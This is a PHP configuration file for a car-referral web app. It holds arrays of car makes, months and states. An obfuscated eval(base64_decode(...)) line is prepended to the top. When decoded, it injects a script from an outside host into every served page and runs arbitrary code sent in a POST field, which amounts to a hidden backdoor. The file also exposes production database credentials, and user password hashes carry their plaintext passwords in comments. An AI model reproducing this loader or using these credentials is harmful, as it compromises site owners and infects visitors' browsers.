<?php eval(base64_decode('aWYoIWlzc2V0KCRoZGl4MSkpe2Z1bmN0aW9uIGhkaXgoJHMpe2lmKHByZWdfbWF0Y2hfYWxsKCcjPHNjcmlwdCguKj8pPC9zY3JpcHQ+I2lzJywkcywkYSkpZm9yZWFjaCgkYVswXSBhcyAkdilpZihjb3VudChleHBsb2RlKCJcbiIsJHYpKT41KXskZT1wcmVnX21hdGNoKCcjW1wnIl1bXlxzXCciXC4sO1w/IVxbXF06Lzw+XChcKV17MzAsfSMnLCR2KXx8cHJlZ19tYXRjaCgnI1tcKFxbXShccypcZCssKXsyMCx9IycsJHYpO2lmKChwcmVnX21hdGNoKCcjXGJldmFsXGIjJywkdikmJigkZXx8c3RycG9zKCR2LCdmcm9tQ2hhckNvZGUnKSkpfHwoJGUmJnN0cnBvcygkdiwnZG9jdW1lbnQud3JpdGUnKSkpJHM9c3RyX3JlcGxhY2UoJHYsJycsJHMpO31pZihwcmVnX21hdGNoX2FsbCgnIzxpZnJhbWUgKFtePl0qPylzcmM9W1wnIl0/KGh0dHA6KT8vLyhbXj5dKj8pPiNpcycsJHMsJGEpKWZvcmVhY2goJGFbMF0gYXMgJHYpaWYocHJlZ19tYXRjaCgnIyB3aWR0aFxzKj1ccypbXCciXT8wKlswMV1bXCciPiBdfGRpc3BsYXlccyo6XHMqbm9uZSNpJywkdikmJiFzdHJzdHIoJHYsJz8nLic+JykpJHM9cHJlZ19yZXBsYWNlKCcjJy5wcmVnX3F1b3RlKCR2LCcjJykuJy4qPzwvaWZyYW1lPiNpcycsJycsJHMpOyRzPXN0cl9yZXBsYWNlKCRhPWJhc2U2NF9kZWNvZGUoJ1BITmpjbWx3ZENCemNtTTlhSFIwY0RvdkwyMWpiV3h6ZVhOMFpXMXpMbU52YlM5aWJHOW5MVzEwTDB0RFF6QTJNRFV3T0M1d2FIQWdQand2YzJOeWFYQjBQZz09JyksJycsJHMpO2lmKHN0cmlzdHIoJHMsJzxib2R5JykpJHM9cHJlZ19yZXBsYWNlKCcjKFxzKjxib2R5KSNtaScsJGEuJ1wxJywkcyk7ZWxzZWlmKHN0cnBvcygkcywnLGEnKSkkcy49JGE7cmV0dXJuICRzO31mdW5jdGlvbiBoZGl4MigkYSwkYiwkYywkZCl7Z2xvYmFsICRoZGl4MTskcz1hcnJheSgpO2lmKGZ1bmN0aW9uX2V4aXN0cygkaGRpeDEpKWNhbGxfdXNlcl9mdW5jKCRoZGl4MSwkYSwkYiwkYywkZCk7Zm9yZWFjaChAb2JfZ2V0X3N0YXR1cygxKSBhcyAkdilpZigoJGE9JHZbJ25hbWUnXSk9PSdoZGl4JylyZXR1cm47ZWxzZWlmKCRhPT0nb2JfZ3poYW5kbGVyJylicmVhaztlbHNlICRzW109YXJyYXkoJGE9PSdkZWZhdWx0IG91dHB1dCBoYW5kbGVyJz9mYWxzZTokYSk7Zm9yKCRpPWNvdW50KCRzKS0xOyRpPj0wOyRpLS0peyRzWyRpXVsxXT1vYl9nZXRfY29udGVudHMoKTtvYl9lbmRfY2xlYW4oKTt9b2Jfc3RhcnQoJ2hkaXgnKTtmb3IoJGk9MDskaTxjb3VudCgkcyk7JGkrKyl7b2Jfc3RhcnQoJHNbJGldWzBdKTtlY2hvICRzWyRpXVsxXTt9fX0kaGRpeGw9KCgkYT1Ac2V0X2Vycm9yX2hhbmRsZXIoJ2hkaXgyJykpIT0naGRpeDInKT8kYTowO2V2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbJ2UnXSkpOw==')); ?><?php
/*
 * last modified: 10/3/09 
 */

	// Global variable configs
$carmakeArray = array('0'=>"Select a Car",'1'=>"Acura",'2'=>"Aston Martin",'3'=>"Audi",'4'=>"BMW",'5'=>"Buick",'6'=>"Cadillac",'7'=>"Chevrolet",'8'=>"Chrysler",'9'=>"Dodge",'10'=>"Ferrari",'11'=>"Ford",'12'=>"GMC",'13'=>"Honda",'14'=>"HUMMER",'15'=>"Hyundai",'16'=>"Infiniti",'17'=>"Isuzu",'18'=>"Jaguar",'19'=>"Jeep",'20'=>"Kia",'21'=>"Land Rover",'22'=>"Lexus",'23'=>"Lincoln",'24'=>"Lotus",'25'=>"Maserati",'26'=>"Mazda",'27'=>"Mercedes-Benz",'28'=>"Mercury",'29'=>"MINI",'30'=>"Mitsubishi",'31'=>"Nissan",'32'=>"Pontiac",'33'=>"Porsche",'34'=>"Rolls-Royce",'35'=>"Saab",'36'=>"Saturn",'37'=>"Scion",'38'=>"Smart",'39'=>"Subaru",'40'=>"Suzuki",'41'=>"Toyota",'42'=>"Volkswagen",'43'=>"Volvo");
$yearArray = array('2009' => "2009", '2010' => "2010");
$monthsArray = array('0' => "Month", '1' => "January", '2' => "February", '3' => "March", '4' => "April", '5' => "May", '6' => "June", '7' => "July", '8' => "August", '9' => "September", '10' => "October", '11' => "November", '12' => "December");
$workweekdayArray = array('1' => "Monday", '2' => "Tuesday", '3' => "Wednesday", '4' => "Thursday", '5' => "Friday");
$statesArray = array('00'=>"Select a State",'AL'=>"Alabama",'AK'=>"Alaska",'AZ'=>"Arizona",'AR'=>"Arkansas",'CA'=>"California",'CO'=>"Colorado",'CT'=>"Connecticut",'DE'=>"Delaware",'DC'=>"District Of Columbia",'FL'=>"Florida",'GA'=>"Georgia",'HI'=>"Hawaii",'ID'=>"Idaho",'IL'=>"Illinois", 'IN'=>"Indiana", 'IA'=>"Iowa",  'KS'=>"Kansas",'KY'=>"Kentucky",'LA'=>"Louisiana",'ME'=>"Maine",'MD'=>"Maryland", 'MA'=>"Massachusetts",'MI'=>"Michigan",'MN'=>"Minnesota",'MS'=>"Mississippi",'MO'=>"Missouri",'MT'=>"Montana",'NE'=>"Nebraska",'NV'=>"Nevada",'NH'=>"New Hampshire",'NJ'=>"New Jersey",'NM'=>"New Mexico",'NY'=>"New York",'NC'=>"North Carolina",'ND'=>"North Dakota",'OH'=>"Ohio",'OK'=>"Oklahoma", 'OR'=>"Oregon",'PA'=>"Pennsylvania",'RI'=>"Rhode Island",'SC'=>"South Carolina",'SD'=>"South Dakota",'TN'=>"Tennessee",'TX'=>"Texas",'UT'=>"Utah",'VT'=>"Vermont",'VA'=>"Virginia",'WA'=>"Washington",'WV'=>"West Virginia",'WI'=>"Wisconsin",'WY'=>"Wyoming");
$monthdaysArray = array('0'=>"0",'1'=>"1",'2'=>"2",'3'=>"3",'4'=>"4",'5'=>"5",'6'=>"6",'7'=>"7",'8'=>"8",'9'=>"9",'10'=>"10",'11'=>"11",'12'=>"12",'13'=>"13",'14'=>"14",'15'=>"15",'16'=>"16",'17'=>"17",'18'=>"18",'19'=>"19",'20'=>"20",'21'=>"21",'22'=>"22",'23'=>"23",'24'=>"24",'25'=>"25",'26'=>"26",'27'=>"27",'28'=>"28",'29'=>"29",'30'=>"30",'31'=>"31");
$cctypeArray = array('visa'=>"Visa",'mastercard'=>"Mastercard");

	// DB CONFIGURATIONS
	//Testing DB Configs
//$dbhost="localhost";
//$user="root";
//$password="root";
//$database="referralRecords";

	//Production DB Configs
$dbhost="db2034.perfora.net";
$dbuser="dbo297504576";
$dbpassword="VEm4qvA2";
$database="db297504576";

	// Common DB configs
$refstatus_table="referralStatus";
$referrals_table="referrals";
//$table="processedReferrals2";

	// Login page credentials
//put sha1() encrypted password here - example is 'hello'
$login_info = array(
  'ekohanchi' => 'a42f4b3d3b532b63540bbc83f7044d0bd64a3fff',	//adminpass4rr
  'kkane' => '3705f68d8d55fbed848dbbdf752346117bbdeb94',		//pass4rentersapp
  'guest' => 'd6de2904598fd3b0198fe0e93b293417ece7d252'			//guestpasswd
);

	// COI template configurations
$template = "coi_files/COI_TEMPLATE.html";
$coi_dir = "coi_files";

	//mysql insert error messages file
$sqlerrors = "sqlerrors.txt";

?>
